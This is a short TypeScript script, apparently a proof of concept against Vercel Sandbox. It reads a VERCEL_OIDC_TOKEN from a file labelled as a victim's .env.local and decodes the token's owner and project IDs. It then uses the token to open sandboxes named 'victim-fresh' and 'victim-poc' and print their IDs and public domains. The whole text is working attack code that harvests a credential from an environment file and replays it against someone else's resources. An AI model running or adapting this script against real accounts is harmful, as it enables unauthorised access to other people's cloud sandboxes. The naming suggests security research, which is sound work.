import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
async function main() {
  for (const name of ["victim-fresh", "victim-poc"]) {
    try {
      const sbx = await Sandbox.get({ name, token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
      console.log(name, "id:", sbx.id);
      try { console.log(name, "domain(3000):", sbx.domain(3000)); } catch (e) { console.log(name, "no port 3000:", (e as Error).message); }
    } catch (e) { console.log(name, "ERR:", (e as Error).message); }
  }
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
